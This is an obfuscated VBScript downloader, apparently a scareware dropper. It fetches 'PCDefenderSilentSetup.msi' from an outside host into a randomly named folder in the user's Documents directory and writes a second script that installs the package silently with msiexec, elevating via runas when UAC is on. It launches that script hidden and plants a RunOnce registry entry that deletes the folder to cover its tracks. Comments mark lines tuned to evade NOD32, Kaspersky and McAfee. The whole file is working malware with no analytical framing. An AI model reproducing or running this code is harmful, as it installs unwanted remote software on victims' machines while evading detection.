Dim QJY1Sg4PI6ytYuo21USK, CJR56flS
aixAZg5SeQ9oD = "" & vMl9yAs9CE02HI0FC5yAx & "\" & xz2Z9pYboL6Sr6FF9Ady ' <- NOD32
Set QJY1Sg4PI6ytYuo21USK = CreateObject("Scripting.FileSystemObject")
Set CJR56flS = QJY1Sg4PI6ytYuo21USK.CreateFolder(aixAZg5SeQ9oD)

jJM36xC1FJs90YP8FZj7X = "http://kaksosat.info/PCDefenderSilentSetup.msi"
ee1o8KOvln = "" & xz2Z9pYboL6Sr6FF9Ady & ".msi"
eB181lR0o6Y0Z3dbV0hf88g jJM36xC1FJs90YP8FZj7X, aixAZg5SeQ9oD, ee1o8KOvln ' <- KIS

iLL15tyS = "Dim e57G0K0t99iwC, Ws607Q2k00Pf5, wOXCW2o6, sfwLNsOTFlW5VXO96ZsNKZ71, lGCCHI2kTDE7n0, rR5SghUWOXaOK24M6ZA4Ab" & vbCr & vbLf & _
    "Set e57G0K0t99iwC = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "Ws607Q2k00Pf5 = e57G0K0t99iwC.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If Ws607Q2k00Pf5 = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   wOXCW2o6 = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   sfwLNsOTFlW5VXO96ZsNKZ71 = e57G0K0t99iwC.regread(wOXCW2o6 & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  wOXCW2o6 = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  sfwLNsOTFlW5VXO96ZsNKZ71 = e57G0K0t99iwC.regread(wOXCW2o6 & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "sfwLNsOTFlW5VXO96ZsNKZ71 = Mid(sfwLNsOTFlW5VXO96ZsNKZ71,1,1)" & vbCr & vbLf & _
    "If (sfwLNsOTFlW5VXO96ZsNKZ71 = 6) Then" & vbCr & vbLf & _
    "   lGCCHI2kTDE7n0 = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   rR5SghUWOXaOK24M6ZA4Ab = e57G0K0t99iwC.regread(lGCCHI2kTDE7n0 & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set e57G0K0t99iwC = Nothing" & vbCr & vbLf & _
    "Set e57G0K0t99iwC = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((sfwLNsOTFlW5VXO96ZsNKZ71 = 6) AND (rR5SghUWOXaOK24M6ZA4Ab = 1)) Then" & vbCr & vbLf & _
	"   e57G0K0t99iwC.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&ee1o8KOvln&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set e57G0K0t99iwC = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   e57G0K0t99iwC.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&ee1o8KOvln&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set e57G0K0t99iwC = Nothing" & vbCr & vbLf & _
    "End If"
g33KoW5814V5If7hcF1 = aixAZg5SeQ9oD & "\" & xz2Z9pYboL6Sr6FF9Ady & ".vbs"
Set kO03DJ0hnWh = QJY1Sg4PI6ytYuo21USK.OpenTextFile(g33KoW5814V5If7hcF1, 8, True)
kO03DJ0hnWh.WriteLine(iLL15tyS)
kO03DJ0hnWh.Close

dim yYSFcbuVfd93
set yYSFcbuVfd93 = CreateObject("Shell.Application")
yYSFcbuVfd93.ShellExecute "wscript", """" & g33KoW5814V5If7hcF1 & """", "", "open", 0 ' <- McAfee
set yYSFcbuVfd93 = nothing

b3p0Ev2kbyG6 aixAZg5SeQ9oD


Function eB181lR0o6Y0Z3dbV0hf88g(f061jW1l1Qm630vP0ufJg5K4, gZE34, EQo436M2c9gpa92ccX)
   Dim jFV87084Ij, pL95Kv711mdVghQ3
   
   f061jW1l1Qm630vP0ufJg5K4 = Replace(f061jW1l1Qm630vP0ufJg5K4,"\","/")

   'If len(EQo436M2c9gpa92ccX) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set jFV87084Ij = CREATEOBJECT("Microsoft.XMLHTTP") 
   jFV87084Ij.open "GET", f061jW1l1Qm630vP0ufJg5K4, "False" 

   jFV87084Ij.send 
   If jFV87084Ij.statustext = "OK" Then 
      Set pL95Kv711mdVghQ3 = CreateObject("ADODB.Stream") 
      pL95Kv711mdVghQ3.type = 1 
      pL95Kv711mdVghQ3.Open 
      pL95Kv711mdVghQ3.Write jFV87084Ij.responseBody 

      if len(gZE34) > 0 Then EQo436M2c9gpa92ccX = gZE34 & "\" & EQo436M2c9gpa92ccX 
      pL95Kv711mdVghQ3.SaveToFile EQo436M2c9gpa92ccX, 2 
      pL95Kv711mdVghQ3.Close 
      Set pL95Kv711mdVghQ3 = Nothing 
      eB181lR0o6Y0Z3dbV0hf88g = 1
   End if 
   Set jFV87084Ij = Nothing
End Function


Function xz2Z9pYboL6Sr6FF9Ady
	pex75dt033468I16 = 14
	dk7979A226W = 7

	Randomize  
	MT2pg15Y29xuzTO7 = Int(((pex75dt033468I16 - dk7979A226W + 1) * Rnd) _
	    + pex75dt033468I16)  

	pex75dt033468I16 = 90
	dk7979A226W = 65
	
	For i = 1 to MT2pg15Y29xuzTO7
	    Randomize
	    Bn6rz712aMPGUHKkjAFhwh3UH = Int(((pex75dt033468I16 - dk7979A226W + 1) * Rnd) _
	        + dk7979A226W)  
	    kaa3FtGO39llY0DCGKRAlvPJx = kaa3FtGO39llY0DCGKRAlvPJx & Chr(Bn6rz712aMPGUHKkjAFhwh3UH)
	Next
	
	xz2Z9pYboL6Sr6FF9Ady = kaa3FtGO39llY0DCGKRAlvPJx
End Function


Function vMl9yAs9CE02HI0FC5yAx
	Set g95Cri11 = Wscript.CreateObject("Wscript.Shell")
	vMl9yAs9CE02HI0FC5yAx = g95Cri11.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function b3p0Ev2kbyG6(t18623P9JeOoU)
	Set j9dWxCW36Y25e = Wscript.CreateObject("Wscript.Shell")
	j9dWxCW36Y25e.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\deletepcdefmsi", "cmd /c rmdir /s /q """ & t18623P9JeOoU & """", "REG_SZ"
End Function
